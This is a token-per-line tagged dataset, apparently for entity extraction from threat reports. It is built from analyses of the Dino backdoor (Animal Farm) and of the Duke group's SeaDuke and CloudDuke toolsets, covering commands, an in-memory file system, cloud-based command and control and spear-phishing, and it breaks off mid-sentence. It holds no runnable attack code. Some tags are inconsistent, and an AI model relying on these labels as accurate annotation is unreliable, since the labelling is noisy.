All	O
the	O
URLs	O
were	O
down	O
when	O
we	O
started	O
our	O
analysis	O
.	O
Those	O
C&Cs	O
were	O
compromised	O
legitimate	O
websites	O
,	O
which	O
is	O
standard	O
operating	O
procedure	O
for	O
Animal	O
Farm	O
.	O
"	O
Version	O
"	O
:	O
Dino	O
's	O
code	O
version;	O
here	O
set	O
to	O
"	O
1.2	O
"	O
,	O
which	O
is	O
confirmed	O
by	O
the	O
"	O
din12	O
"	O
folder	O
used	O
in	O
one	O
of	O
the	O
C&C	O
URLs	O
.	O
For	O
the	O
record	O
,	O
a	O
"	O
d13	O
"	O
folder	O
has	O
been	O
seen	O
on	O
another	O
Animal	O
Farm	O
C&C	O
(	O
see	O
"	O
3.7	O
Calling	O
home	O
"	O
of	O
Marschalek	O
's	O
Babar	O
report	O
)	O
,	O
indicating	O
that	O
Dino	O
version	O
1.3	O
has	O
also	O
likely	O
been	O
deployed	O
at	O
some	O
point	O
.	O
"	O
BD_Keys	O
"	O
and	O
"	O
CC_Keys	O
"	O
contain	O
cryptographic	O
keys	O
to	O
encrypt	O
the	O
network	B-Entity
communications	I-Entity
with	B-Modifier
C&C	B-Entity
servers	O
.	O
Their	O
values	O
start	O
with	O
the	O
word	O
"	O
MAGICBOX	O
"	O
.	O
The	O
three	O
last	O
keys	O
are	O
displayed	O
with	O
obfuscated	O
names	O
(	O
"	O
xT0rvwz	O
"	O
,	O
"	O
tr4qa589	O
"	O
and	O
"	O
jopcft4	O
T	O
"	O
)	O
and	O
store	O
parameters	O
for	O
the	O
custom	O
file	O
system	O
we	O
will	O
describe	O
later	O
.	O
The	O
following	O
Table	O
lists	O
the	O
commands	O
accepted	O
by	O
this	O
Dino	O
binary	O
with	O
the	O
names	O
chosen	O
by	O
the	O
developers	O
.	O
Each	O
of	O
those	O
commands	O
can	O
take	O
one	O
or	O
more	O
arguments	O
.	O
One	O
command	O
of	O
particular	O
interest	O
is	O
"	O
search	O
"	O
,	O
which	O
allows	O
the	B-Entity
operators	I-Entity
to	O
look	B-Action
for	B-Modifier
files	B-Entity
very	O
precisely	O
.	O
For	O
example	O
,	O
it	B-Entity
can	O
provide	O
all	O
files	O
with	O
a	O
"	O
.doc	O
"	O
extension	O
,	O
the	O
size	O
of	O
which	O
is	O
bigger	O
than	O
10	O
kilobytes	O
,	O
and	O
that	O
were	O
modified	O
in	O
the	O
last	O
3	O
days	O
.	O
We	O
believe	O
this	O
exfiltration	O
of	O
files	O
to	O
be	O
Dino	O
's	O
end	O
goal	O
.	O
At	O
startup	O
Dino	O
executes	O
successively	O
the	O
commands	O
stored	O
in	O
the	O
"	O
InitialCommands	O
"	O
field	O
in	O
its	O
configuration;	O
in	O
the	O
sample	O
we	O
analyzed	O
they	O
are	O
.	O
Those	O
commands	O
serve	O
as	O
a	O
reconnaissance	O
step	O
for	O
the	O
operators	O
.	O
Their	O
execution	O
is	O
managed	O
by	O
the	O
CMDEXEC	O
module	O
,	O
the	O
commands	O
being	O
stored	O
in	O
a	O
queue	O
inside	O
the	O
CMDEXECQ	O
module	O
.	O
The	O
result	O
is	O
reported	B-Action
to	B-Modifier
the	O
C&C	B-Entity
server	I-Entity
.	O
After	O
having	O
described	O
Dino	O
's	O
basics	O
,	O
we	O
are	O
now	O
going	O
to	O
dig	O
into	O
two	O
particularly	O
interesting	O
components;	O
first	O
,	O
a	O
custom	O
file	O
system	O
used	O
by	O
the	O
malware	O
,	O
and	O
then	O
the	O
CRONTAB	O
module	O
in	O
charge	O
of	O
task	O
scheduling	O
.	O
Dino	O
contains	B-Action
a	B-Entity
custom	I-Entity
file	I-Entity
system	I-Entity
named	O
"	O
ramFS	O
"	O
by	O
its	O
developers	O
.	O
It	O
provides	O
a	O
complex	O
data	O
structure	O
to	O
store	B-Action
files	B-Entity
in	B-Modifier
memory	B-Entity
,	O
each	O
of	O
them	O
bearing	O
a	O
name	O
corresponding	O
to	O
filenames	O
used	O
by	O
usual	O
file	O
systems	O
.	O
RamFS	O
also	O
comes	O
with	O
a	O
set	O
of	O
custom	O
commands	O
that	O
can	O
be	O
stored	O
in	O
files	O
and	O
executed	O
.	O
It	O
should	O
be	O
noticed	O
that	O
ramFS	O
is	O
also	O
present	O
in	O
other	O
Animal	O
Farm	O
binaries	O
(	O
see	O
attribution	O
paragraph	O
below	O
)	O
,	O
but	O
since	O
we	O
are	O
unaware	O
of	O
previous	O
analysis	O
of	O
ramFS	O
,	O
we	O
are	O
describing	O
our	O
findings	O
here	O
.	O
RamFS	O
content	O
is	O
initially	O
stored	O
encrypted	O
in	O
Dino	O
's	O
configuration	O
under	O
the	O
key	O
"	O
xT0rvwz	O
"	O
,	O
whereas	O
the	O
corresponding	O
RC4	O
key	O
is	O
stored	O
under	O
the	O
key	O
"	O
tr4qa589	O
"	O
.	O
Once	O
the	O
file	O
system	O
has	O
been	O
decrypted	O
,	O
it	O
is	O
stored	O
in	O
memory	O
as	O
a	O
linked	O
list	O
of	O
512	O
byte	O
memory	O
chunks	O
,	O
each	O
one	O
of	O
them	O
being	O
individually	O
RC4	O
encrypted	O
.	O
When	O
looking	O
for	O
a	O
file	O
in	O
ramFS	O
,	O
each	O
chunk	O
is	O
decrypted	O
,	O
processed	O
and	O
then	O
re	O
encrypted	O
.	O
Hence	O
there	O
are	O
very	O
few	O
noticeable	O
traces	O
of	O
ramFS	O
during	O
its	O
use	O
.	O
Here	O
are	O
some	O
high	O
level	O
characteristics	O
of	O
this	O
file	O
system	O
.	O
Several	O
commands	O
can	O
be	O
executed	B-Action
in	O
the	O
context	B-Entity
of	I-Entity
ramFS	I-Entity
,	O
as	O
listed	O
in	O
the	O
following	O
Table	O
.	O
In	O
the	O
case	O
of	O
Dino	O
,	O
ramFS	O
serves	O
as	O
protected	O
storage	O
for	O
one	O
specific	O
file	O
containing	O
the	O
instructions	O
to	O
remove	O
the	O
malware	O
from	O
the	O
machine	O
.	O
The	O
developers	O
named	O
this	O
file	O
the	O
"	O
cleaner	O
"	O
and	O
it	O
is	O
executed	O
when	O
Dino	O
receives	O
the	O
command	O
"	O
killBD	O
"	O
(	O
the	O
"	O
BD	O
"	O
acronym	O
is	O
the	O
developers	O
'	O
designation	O
of	O
the	O
malware	O
)	O
.	O
Figure	O
2	O
shows	O
the	O
code	O
responsible	O
for	O
executing	O
this	O
cleaner	O
file	O
.	O
First	O
,	O
it	O
retrieves	O
the	O
name	O
of	O
the	O
file	O
from	O
Dino	O
's	O
configuration	O
(	O
"	O
a.ini	O
"	O
)	O
,	O
then	O
it	O
retrieves	O
the	O
key	O
to	O
decrypt	O
ramFS	O
,	O
and	O
it	O
finally	O
mounts	O
the	O
file	O
system	O
in	O
memory	O
in	O
order	O
to	O
execute	O
the	O
cleaner	O
file	O
stored	O
inside	O
.	O
The	O
verbosity	O
of	O
the	O
error	O
messages	O
makes	O
it	O
particularly	O
easy	O
to	O
understand	O
the	O
purpose	O
of	O
the	O
code	O
.	O
The	O
cleaner	B-Entity
file	I-Entity
contains	O
the	O
string	O
"	O
INSTALL	O
A	O
"	O
wusvcd	O
"	O
U	O
"	O
which	O
,	O
once	O
executed	O
,	O
will	O
uninstall	O
the	O
malware	O
from	O
the	O
machine	O
–	O
"	O
wusvcd	O
"	O
being	O
the	O
name	O
used	O
to	O
register	O
Dino	O
on	O
the	O
machine	O
.	O
Hence	O
,	O
ramFS	B-Entity
serves	B-Action
as	O
a	O
protected	B-Entity
container	I-Entity
for	I-Entity
files	I-Entity
to	I-Entity
be	I-Entity
executed	I-Entity
on	I-Entity
the	I-Entity
machine	I-Entity
,	O
offering	O
a	O
disposable	B-Entity
execution	I-Entity
environment	I-Entity
to	I-Entity
the	I-Entity
operators	I-Entity
and	O
leaving	O
very	O
few	B-Entity
traces	I-Entity
on	I-Entity
the	I-Entity
system	I-Entity
.	O
The	O
commands	O
"	O
cronadd	O
"	O
,	O
"	O
cronlist	O
"	O
and	O
"	O
crondel	O
"	O
serve	O
respectively	O
to	O
add	O
,	O
list	O
,	O
and	O
remove	B-Action
scheduled	B-Entity
tasks	I-Entity
registered	O
in	O
the	O
CRONTAB	O
module	O
.	O
Those	O
tasks	O
are	O
Dino	O
's	O
commands	O
.	O
The	O
syntax	O
to	O
define	O
scheduled	O
tasks	O
is	O
similar	O
to	O
the	O
one	O
used	O
by	O
the	O
cron	O
Unix	O
command	O
.	O
In	O
particular	O
the	O
time	O
at	O
which	O
to	O
run	O
a	O
command	O
is	O
given	O
by	O
a	O
string	O
following	O
the	O
format	O
"	O
minute	O
hour	O
day	O
month	O
year	O
dayofweek	O
"	O
.	O
Alternatively	O
,	O
this	O
string	O
can	O
be	O
replaced	O
by	O
"	O
@boot	O
"	O
for	O
a	O
command	O
to	O
run	O
at	O
each	O
startup	O
–	O
whereas	O
some	O
Unix	O
cron	O
implementations	O
accept	O
"	O
@reboot	O
"	O
.	O
As	O
an	O
example	O
,	O
here	O
is	O
the	O
output	O
of	O
the	O
"	O
cronlist	O
"	O
command	O
after	O
a	O
"	O
wakeup	O
"	O
command	O
has	O
been	O
scheduled	O
to	O
run	O
on	O
7th	O
April	O
2015	O
at	O
15:44	O
.	O
As	O
we	O
can	O
see	O
,	O
each	O
entry	O
is	O
identified	O
by	O
an	O
"	O
I	O
d	O
"	O
,	O
an	O
incrementing	O
hexadecimal	O
number	O
starting	O
at	O
0xC0	O
.	O
The	O
purpose	O
of	O
the	O
"	O
Local	O
"	O
field	O
remains	O
unclear	O
(	O
the	O
other	O
possible	O
value	O
being	O
"	O
l	O
"	O
)	O
.	O
The	O
"	O
Count	O
"	O
parameter	O
counts	O
the	O
number	O
of	O
times	O
a	O
command	O
has	O
been	O
executed	O
,	O
"	O
1	O
"	O
indicating	O
the	O
command	O
will	O
be	O
executed	O
only	O
once	O
.	O
Finally	O
,	O
the	O
"	O
Visibility	O
"	O
field	O
defines	O
whether	O
the	O
command	O
execution	O
will	O
be	O
reported	O
to	O
the	O
C&C	O
(	O
the	O
other	O
possible	O
value	O
being	O
"	O
Silent	O
"	O
)	O
.	O
The	O
amount	O
of	O
shared	O
code	O
between	O
Dino	O
and	O
known	O
Animal	O
Farm	O
malware	O
leaves	O
very	O
little	O
doubt	O
that	O
Dino	O
belongs	O
to	O
Animal	O
Farm	O
's	O
arsenal	O
.	O
Among	O
these	O
shared	O
features	O
,	O
we	O
can	O
cite	O
the	O
following	O
.	O
At	O
the	O
very	O
beginning	O
of	O
Dino	O
execution	O
,	O
the	B-Entity
current	I-Entity
process	I-Entity
name	I-Entity
is	O
checked	O
against	O
process	O
names	B-Entity
used	I-Entity
by	I-Entity
some	I-Entity
sandboxes	I-Entity
.	O
A	O
very	O
similar	O
check	O
(	O
against	O
"	O
klavme	O
"	O
,	O
"	O
myapp	O
"	O
,	O
"	O
TESTAPP	O
"	O
and	O
"	O
afyjevmv.exe	O
"	O
)	O
is	O
present	O
in	O
Bunny	O
samples	O
,	O
and	O
in	O
some	O
first	O
stage	O
implants	O
deployed	O
by	O
Animal	O
Farm	O
.	O
To	O
hide	O
its	O
calls	O
to	O
certain	O
API	O
functions	O
,	O
Dino	O
employs	O
a	O
classic	O
Animal	O
Farm	O
ploy	O
:	O
a	O
hash	O
is	O
calculated	O
from	O
the	O
function	O
's	O
name	O
and	O
used	O
to	O
look	O
for	O
the	O
address	O
of	O
the	O
API	O
function	O
.	O
The	O
actual	O
hashing	O
algorithm	O
used	O
in	O
Dino	O
is	O
the	O
same	O
that	O
was	O
used	O
in	O
Casper	O
,	O
namely	O
a	O
combination	O
of	O
rotate	O
left	O
(	O
ROL	O
)	O
of	O
7	O
bits	O
and	O
exclusive	O
or	O
(	O
XOR	O
)	O
operations	O
.	O
The	O
Dino	O
's	O
custom	O
file	O
system	O
–	O
the	O
so	O
called	O
ramFS	O
–	O
is	O
present	O
in	O
several	O
droppers	O
used	O
by	O
Animal	O
Farm	O
.	O
In	O
those	O
binaries	O
the	O
file	O
system	O
serves	O
to	O
set	O
the	O
persistence	O
of	O
the	O
payload	O
.	O
For	O
example	O
,	O
here	O
is	O
the	O
command	O
executed	O
by	O
some	O
NBOT	O
droppers	O
in	O
the	O
context	O
of	O
ramFS	O
.	O
As	O
a	O
final	O
indication	O
that	O
Dino	O
belongs	O
to	O
Animal	O
Farm	O
menagerie	O
,	O
it	O
is	O
noticeable	O
that	O
the	O
output	O
of	O
Dino	O
's	O
sysinfo	O
command	O
looks	O
like	O
an	O
updated	O
version	O
of	O
the	O
"	O
beacon	O
"	O
from	O
the	O
SNOWBALL	O
implant	O
described	O
in	O
the	O
leaked	O
CSE	O
slides	O
–	O
part	O
of	O
operation	O
SNOWGLOBE	O
,	O
which	O
led	O
to	O
the	O
discovery	O
of	O
Babar	O
.	O
Dino	O
's	O
sysinfo	O
example	O
output	O
Login	O
/	O
Domain	O
(	O
owner	O
)	O
:	O
Administrator	O
/	O
JOHN	O
(	O
john	O
)	O
Computer	O
name	O
:	O
JOHN	O
Organization	O
(	O
country	O
)	O
.	O
(	O
United	O
States	O
)	O
RecId	O
:	O
11173	O
01	O
PRS	O
MaxDelay	O
:	O
3600	O
Version	O
:	O
1.2	O
OS	O
version	O
(	O
SP	O
)	O
:	O
5.1	O
(	O
Service	O
Pack	O
3	O
)	O
WOW64	O
:	O
No	O
Default	O
browser	O
:	O
firefox.exe	O
IE	O
version	O
:	O
Mozilla/4.0	O
(	O
compatible;	O
MSIE	O
7.0;	O
Win32	O
)	O
First	O
launch	O
:	O
04/01/2015	O
–	O
18:31:14	O
Time	O
to	O
kill	O
:	O
N	O
/	O
A	O
Last	O
launch	O
:	O
04/01/2015	O
–	O
19:21:44	O
Mode	O
:	O
N	O
/	O
A	O
|	O
Rights	O
:	O
Admin	O
|	O
UAC	O
:	O
No	O
ID	O
:	O
4635BEF0	O
D89D	O
11E4	O
B283	O
000C	O
29FD2872	O
InstallAv	O
:	O
0	O
Inj	O
:	O
Yes	O
SNOWBALL	O
implant	O
beacon	O
All	O
these	O
indicators	O
together	O
make	O
us	O
very	O
confident	O
that	O
Dino	O
was	O
developed	O
by	O
the	O
Animal	O
Farm	O
group	O
.	O
Dino	O
adds	O
at	O
least	O
two	O
more	O
indicators	O
to	O
those	O
already	O
documented	O
suggesting	O
that	O
Animal	O
Farm	O
developers	O
are	O
French	O
speaking	O
.	O
Dino	O
's	O
binary	O
contains	O
a	O
resource	O
whose	O
language	O
code	O
value	O
is	O
1036	O
.	O
The	O
original	O
purpose	O
of	O
this	O
language	O
code	O
is	O
to	O
allow	O
developers	O
to	O
provide	O
resources	O
(	O
menus	O
,	O
icons	O
,	O
version	O
information	O
…	O
)	O
for	O
different	O
locations	O
in	O
the	O
world	O
in	O
the	O
corresponding	O
language	O
.	O
Interestingly	O
,	O
when	O
a	O
developer	O
does	O
not	O
manually	O
specify	O
the	O
language	O
code	O
,	O
the	O
compiler	O
sets	O
it	O
to	O
the	O
language	O
of	O
the	O
developer	O
's	O
machine	O
.	O
So	O
,	O
which	O
language	O
corresponds	O
to	O
the	O
value	O
1036	O
,	O
or	O
0x40c	O
in	O
hexadecimal	O
?	O
French	O
(	O
France	O
)	O
.	O
Of	O
course	O
a	O
non	O
French	O
speaking	O
developer	O
could	O
have	O
deliberately	O
set	O
this	O
value	O
to	O
mislead	O
attribution	O
efforts	O
.	O
But	O
in	O
more	O
recent	O
Animal	O
Farm	O
binaries	O
(	O
for	O
example	O
Casper	O
)	O
,	O
this	O
language	O
code	O
has	O
been	O
set	O
to	O
the	O
classical	O
English	O
(	O
USA	O
)	O
language	O
code	O
.	O
Therefore	O
,	O
it	O
seems	O
that	O
Animal	O
Farm	O
developers	O
forgot	O
to	O
set	O
this	O
value	O
in	O
their	O
first	O
creations	O
,	O
realized	O
their	O
mistake	O
at	O
some	O
point	O
,	O
and	O
decided	O
to	O
set	O
a	O
standard	O
value	O
.	O
Someone	O
using	O
the	O
language	O
code	O
as	O
a	O
false	O
flag	O
would	O
have	O
likely	O
kept	O
the	O
strategy	O
going	O
.	O
For	O
the	O
record	O
,	O
this	O
Dino	O
sample	O
is	O
not	O
the	O
only	O
Animal	O
Farm	O
binary	O
with	O
1036	O
as	O
language	O
code	O
.	O
Dino	O
's	O
binary	O
is	O
statically	O
linked	O
with	O
the	O
GnuMP	O
library	O
,	O
which	O
is	O
used	O
to	O
manipulate	O
big	O
numbers	O
in	O
cryptography	O
algorithms	O
.	O
The	O
GnuMP	O
code	O
in	O
Dino	O
contains	O
file	O
paths	O
coming	O
from	O
the	O
developer	O
's	O
machine	O
.	O
As	O
the	O
attentive	O
reader	O
has	O
probably	O
guessed	O
,	O
"	O
arithmetique	O
"	O
is	O
the	O
French	O
translation	O
of	O
"	O
arithmetic	O
"	O
.	O
Dino	O
's	O
binary	O
shows	O
an	O
intense	O
development	O
effort	O
,	O
from	O
custom	O
data	O
structures	O
to	O
a	O
homemade	O
file	O
system	O
.	O
As	O
with	O
other	O
Animal	O
Farm	O
binaries	O
,	O
it	O
bears	O
the	O
mark	O
of	O
professional	O
and	O
experienced	O
developers	O
.	O
But	O
Dino	O
also	O
shows	O
a	O
poor	O
knowledge	O
,	O
or	O
interest	O
,	O
from	O
these	O
developers	O
in	O
anti	O
analysis	O
techniques	O
–	O
contrary	O
to	O
what	O
was	O
seen	O
in	O
Casper	O
–	O
as	O
demonstrated	O
,	O
for	O
example	O
,	O
by	O
the	O
verbosity	O
of	O
some	O
Dino	O
's	O
log	O
messages	O
.	O
All	O
those	O
messages	O
provide	O
substantial	O
help	O
in	O
understanding	O
Dino	O
's	O
internal	O
workings	O
.	O
One	O
will	O
also	O
appreciate	O
the	O
numerous	O
misspellings	O
contained	O
in	O
the	O
messages	O
.	O
Regarding	O
Dino	O
's	O
victims	O
,	O
we	O
know	O
very	O
little	O
except	O
that	O
they	O
were	O
located	O
in	O
Iran	O
in	O
2013	O
.	O
This	O
is	O
in	O
accordance	O
with	O
the	O
victimology	O
described	O
by	O
Canada	O
's	O
CSE	O
in	O
its	O
presentation	O
.	O
That	O
leads	O
us	O
to	O
the	O
final	O
point	O
of	O
this	O
blog	O
:	O
several	O
signs	O
suggest	O
that	O
Dino	O
's	O
creators	O
are	O
French	O
speaking	O
developers	O
.	O
These	O
signs	O
add	O
to	O
the	O
pretty	O
long	O
list	O
of	O
indicators	O
already	O
supporting	O
this	O
hypothesis	O
,	O
in	O
particular	O
the	O
ones	O
mentioned	O
by	O
Canada	O
's	O
CSE	O
.	O
Recent	O
weeks	O
have	O
seen	O
the	O
outing	O
of	O
two	O
new	O
additions	O
to	O
the	O
Duke	O
group	O
's	O
toolset	O
,	O
SeaDuke	O
and	O
CloudDuke	O
.	O
Of	O
these	O
,	O
SeaDuke	O
is	O
a	O
simple	O
trojan	O
made	O
interesting	O
by	O
the	O
fact	O
that	O
it	O
's	O
written	O
in	O
Python	O
.	O
And	O
even	O
more	O
curiously	O
,	O
SeaDuke	O
,	O
with	O
its	O
built	O
-	O
in	O
support	O
for	O
both	O
Windows	O
and	O
Linux	O
,	O
is	O
the	O
first	O
cross	O
-	O
platform	O
malware	O
we	O
have	O
observed	O
from	O
the	O
Duke	O
group	O
.	O
While	O
SeaDuke	O
is	O
a	O
single	O
-	O
albeit	O
cross-	O
platform	O
-	O
trojan	O
,	O
CloudDuke	O
appears	O
to	O
be	O
an	O
entire	O
toolset	O
of	O
malware	O
components	O
,	O
or	O
"	O
solutions	O
"	O
as	O
the	O
Duke	O
group	O
apparently	O
calls	O
them	O
.	O
These	O
components	O
include	O
a	O
unique	O
loader	O
,	O
downloader	O
,	O
and	O
not	O
one	O
but	O
two	O
different	O
trojan	O
components	O
.	O
CloudDuke	O
also	O
greatly	O
expands	O
on	O
the	O
Duke	O
group	O
's	O
usage	O
of	O
cloud	O
storage	O
services	O
,	O
specifically	O
Microsoft	O
's	O
OneDrive	O
,	O
as	O
a	O
channel	O
for	O
both	O
command	O
and	O
control	O
as	O
well	O
as	O
the	O
exfiltration	O
of	O
stolen	O
data	O
.	O
Finally	O
,	O
some	O
of	O
the	O
recent	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
have	O
born	O
a	O
striking	O
resemblance	O
to	O
CozyDuke	O
spear	O
-	O
phishing	O
campaigns	O
from	O
a	O
year	O
ago	O
.	O
Last	O
week	O
,	O
both	O
Symantec	O
and	O
Palo	O
Alto	O
Networks	O
published	O
research	O
on	O
SeaDuke	O
,	O
a	O
newer	O
addition	O
to	O
the	O
arsenal	O
of	O
trojans	O
being	O
used	O
by	O
the	O
Duke	O
group	O
.	O
While	O
older	O
malware	O
by	O
the	O
Duke	O
group	O
has	O
always	O
been	O
written	O
with	O
a	O
combination	O
of	O
the	O
C	O
and	O
C++	O
programming	O
languages	O
as	O
well	O
as	O
assembly	O
language	O
,	O
SeaDuke	O
is	O
peculiarly	O
written	O
in	O
Python	O
with	O
multiple	O
layers	O
of	O
obfuscation	O
.	O
This	O
Python	O
code	O
is	O
usually	O
then	O
compiled	O
into	O
Windows	O
executables	O
using	O
py2exe	O
or	O
pyinstaller	O
.	O
However	O
,	O
the	O
Python	O
code	O
itself	O
has	O
been	O
designed	O
to	O
work	O
on	O
both	O
Windows	O
and	O
Linux	O
.	O
We	O
therefore	O
suspect	O
,	O
that	O
the	O
Duke	O
group	O
is	O
also	O
using	O
the	O
same	O
SeaDuke	O
Python	O
code	O
to	O
target	O
Linux	O
victims	O
.	O
This	O
is	O
the	O
first	O
time	O
we	O
have	O
seen	O
the	O
Duke	O
group	O
employ	O
malware	O
to	O
target	O
Linux	O
platforms	O
.	O
Last	O
week	O
,	O
we	O
also	O
saw	O
Palo	O
Alto	O
Networks	O
and	O
Kaspersky	O
Labs	O
publish	O
research	O
on	O
malware	O
components	O
they	O
respectively	O
called	O
MiniDionis	O
and	O
CloudLook	O
.	O
MiniDionis	O
and	O
CloudLook	O
are	O
both	O
components	O
of	O
a	O
larger	O
malware	O
toolset	O
we	O
call	O
CloudDuke	O
.	O
This	O
toolset	O
consists	O
of	O
malware	O
components	O
that	O
provide	O
varying	O
functionality	O
while	O
partially	O
relying	O
on	O
a	O
shared	O
code	O
framework	O
and	O
always	O
using	O
the	O
same	O
loader	O
.	O
Based	O
on	O
PDB	O
strings	O
found	O
in	O
the	O
samples	O
,	O
the	O
malware	O
authors	O
refer	O
to	O
the	O
CloudDuke	O
components	O
as	O
"	O
solutions	O
"	O
with	O
names	O
such	O
as	O
"	O
DropperSolution	O
"	O
,	O
"	O
BastionSolution	O
"	O
and	O
"	O
OneDriveSolution	O
"	O
.	O
A	O
list	O
of	O
PDB	O
strings	O
we	O
have	O
observed	O
is	O
below	O
.	O
The	O
first	O
of	O
the	O
CloudDuke	O
components	O
we	O
have	O
observed	O
is	O
a	O
downloader	O
internally	O
called	O
"	O
DropperSolution	O
"	O
.	O
The	O
purpose	O
of	O
the	B-Entity
downloader	I-Entity
is	O
to	O
download	O
and	O
execute	O
additional	O
malware	O
on	O
the	O
victim	B-Entity
's	I-Entity
system	I-Entity
.	O
In	O
most	O
observed	O
cases	O
,	O
the	B-Entity
downloader	I-Entity
will	O
attempt	O
to	O
connect	B-Action
to	B-Modifier
a	O
compromised	B-Entity
website	I-Entity
to	B-Modifier
download	O
an	O
encrypted	B-Entity
malicious	I-Entity
payload	I-Entity
which	O
the	B-Entity
downloader	I-Entity
will	O
decrypt	O
and	O
execute	O
.	O
Depending	O
on	O
the	O
way	O
the	O
downloader	O
has	O
been	O
configured	O
,	O
in	O
some	O
cases	O
it	O
may	O
first	O
attempt	O
to	O
log	O
in	O
to	O
Microsoft	O
's	O
cloud	O
storage	O
service	O
OneDrive	O
and	O
retrieve	O
the	O
payload	O
from	O
there	O
.	O
If	O
no	O
payload	O
is	O
available	O
from	O
OneDrive	O
,	O
the	O
downloader	O
will	O
revert	O
to	O
the	O
previously	O
mentioned	O
method	O
of	O
downloading	O
from	O
compromised	O
websites	O
.	O
We	O
have	O
also	O
observed	O
two	O
distinct	O
trojan	O
components	O
in	O
the	O
CloudDuke	O
toolset	O
.	O
The	O
first	O
of	O
these	O
,	O
internally	O
called	O
"	O
BastionSolution	O
"	O
,	O
is	O
the	O
trojan	O
that	O
Palo	O
Alto	O
Networks	O
described	O
in	O
their	O
research	O
into	O
"	O
MiniDionis	O
"	O
.	O
Interestingly	O
,	O
BastionSolution	O
appears	O
to	O
functionally	O
be	O
an	O
exact	O
copy	O
of	O
SeaDuke	O
with	O
the	O
only	O
real	O
difference	O
being	O
the	O
choice	O
of	O
programming	O
language	O
.	O
BastionSolution	O
also	O
makes	O
significant	O
use	O
of	O
a	O
code	O
framework	O
that	O
is	O
apparently	O
internally	O
called	O
"	O
Z	O
"	O
.	O
This	O
framework	O
provides	O
classes	O
for	O
functionality	O
such	O
as	O
encryption	O
,	O
compression	O
,	O
randomization	O
and	O
network	O
communications	O
.	O
Classes	O
from	O
the	O
same	O
"	O
Z	O
"	O
framework	O
,	O
such	O
as	O
the	O
encryption	O
and	O
randomization	O
classes	O
,	O
are	O
also	O
used	O
by	O
the	O
second	O
trojan	O
component	O
of	O
the	O
CloudDuke	O
toolset	O
.	O
This	O
second	O
component	O
,	O
internally	O
called	O
"	O
OneDriveSolution	O
"	O
,	O
is	O
especially	O
interesting	O
because	O
it	O
relies	O
on	O
Microsoft	O
's	B-Entity
cloud	I-Entity
storage	I-Entity
service	I-Entity
OneDrive	I-Entity
as	I-Entity
its	B-Action
command	B-Entity
and	I-Entity
control	I-Entity
channel	I-Entity
.	O
To	O
achieve	O
this	O
,	O
OneDriveSolution	O
will	O
attempt	O
to	O
log	O
into	O
OneDrive	O
with	O
a	O
preconfigured	O
username	O
and	O
password	O
.	O
If	O
successful	O
,	O
OneDriveSolution	O
will	O
then	O
proceed	O
to	O
copy	B-Action
data	B-Entity
from	O
the	O
victim	B-Entity
's	I-Entity
computer	I-Entity
to	B-Modifier
the	O
OneDrive	B-Entity
account	I-Entity
.	O
It	O
will	O
also	O
search	O
the	O
OneDrive	B-Entity
account	I-Entity
for	O
files	B-Action
containing	B-Entity
commands	I-Entity
for	I-Entity
the	I-Entity
malware	I-Entity
to	I-Entity
execute	I-Entity
.	O
All	O
of	O
the	O
CloudDuke	O
"	O
solutions	O
"	O
use	B-Action
the	B-Entity
same	I-Entity
loader	I-Entity
,	O
a	O
piece	O
of	O
code	O
whose	O
primary	O
purpose	O
is	O
to	O
decrypt	O
the	O
embedded	O
,	O
encrypted	O
solution	O
,	O
load	B-Action
it	B-Entity
in	B-Modifier
memory	B-Entity
and	O
execute	B-Action
it	B-Entity
.	O
The	O
Duke	O
group	O
has	O
often	O
employed	O
loaders	O
for	O
their	O
malware	O
but	O
unlike	O
the	O
previous	O
loaders	O
they	O
have	O
used	O
,	O
the	O
CloudDuke	O
loader	O
is	O
much	O
more	O
versatile	O
with	O
support	O
for	O
multiple	O
methods	O
of	O
loading	O
and	O
executing	O
the	O
final	O
payload	O
as	O
well	O
as	O
the	O
ability	O
to	O
write	O
to	O
disk	O
and	O
execute	O
additional	O
malware	O
components	O
.	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
and	O
similarities	O
with	O
CozyDuke	O
CloudDuke	O
has	O
recently	O
been	O
spread	O
via	O
spear	O
-	O
phishing	O
emails	O
with	O
targets	O
reportedly	O
including	O
organizations	O
such	O
as	O
the	O
US	O
Department	O
of	O
Defense	O
.	O
These	O
spear	O
-	O
phising	O
emails	O
have	O
contained	O
links	O
to	O
compromised	O
websites	O
hosting	O
zip	O
archives	O
that	O
contain	O
CloudDuke	O
-	O
laden	O
executables	O
.	O
In	O
most	O
cases	O
,	O
executing	O
these	O
executables	O
will	O
have	O
resulted	O
in	O
two	B-Entity
additional	I-Entity
files	I-Entity
being	B-Action
written	I-Action
to	B-Modifier
the	O
victim	B-Entity
's	I-Entity
hard	I-Entity
disk	I-Entity
.	O
The	O
first	O
of	O
these	O
files	O
has	O
been	O
a	O
decoy	O
,	O
such	O
as	O
an	O
audio	O
file	O
or	O
a	O
PDF	O
file	O
while	O
the	O
second	O
one	O
has	O
been	O
a	O
CloudDuke	O
loader	O
embedding	O
a	O
CloudDuke	O
downloader	O
,	O
the	O
so	O
-	O
called	O
"	O
DropperSolution	O
"	O
.	O
In	O
these	O
cases	O
,	O
the	O
victim	O
has	O
been	O
presented	O
with	O
the	O
decoy	O
file	O
while	O
in	O
the	O
background	O
the	O
downloader	O
has	O
proceeded	O
to	O
download	O
and	O
execute	O
one	O
of	O
the	O
CloudDuke	O
trojans	O
,	O
"	O
OneDriveSolution	O
"	O
or	O
"	O
BastionSolution	O
"	O
.	O
Interestingly	O
,	O
however	O
,	O
some	O
of	O
the	O
other	O
CloudDuke	O
spear	O
-	O
phishing	O
campaigns	O
we	O
have	O
observed	O
this	O
July	O
have	O
born	O
a	O
striking	O
resemblance	O
to	O
CozyDuke	O
spear	O
-	O
phishing	O
campaigns	O
seen	O
almost	O
exactly	O
a	O
year	O
ago	O
,	O
in	O
the	O
beginning	O
of	O
July	O
2014	O
.	O
In	O
both	O
spear	O
-	O
phishing	O
campaigns	O
,	O
the	O
decoy	O
document	O
has	O
been	O
the	O
exact	O
same	O
PDF	O
file	O
,	O
a	O
"	O
US	O
letter	O
fax	O
test	O
page	O
"	O
(	O
28d29c702fdf3c16f27b33f3e32687dd82185e8b	O
)	O
.	O
Similarly	O
,	O
the	O
URLs	O
hosting	O
the	O
malicious	O
files	O
have	O
,	O
in	O
both	O
campaigns	O
,	O
purported	O
to	O
be	O
related	O
to	O
eFaxes	O
.	O
It	O
is	O
also	O
interesting	O
to	O
note	O
,	O
that	O
in	O
the	O
case	O
of	O
the	O
CozyDuke	O
-	O
inspired	O
CloudDuke	O
spear	O
-	O
phishing	O
campaign	O
,	O
the	O
downloading	O
and	O
